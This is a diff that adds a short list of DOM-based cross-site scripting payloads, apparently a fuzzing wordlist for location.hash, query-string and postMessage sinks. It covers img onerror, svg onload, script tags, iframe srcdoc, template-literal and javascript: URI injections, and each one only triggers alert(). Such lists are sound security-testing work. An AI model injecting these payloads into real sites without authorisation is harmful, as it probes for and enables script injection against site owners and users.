@@ -1,0 +1,13 @@
+# DOM sources: location.hash / search / postMessage sinks.
+#<img src=x onerror=alert(1)>
+#<svg onload=alert(1)>
+#<script>alert(1)</script>
+?xss="><img src=x onerror=alert(1)>
+#'><img src=x onerror=alert(1)>
+#-alert(1)-
+#<details open ontoggle=alert(1)>
+?q=';alert(1)//
+#<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
+#${alert(1)}
+#<img src=x onerror=alert(document.domain)>
+#javascript:alert(1)
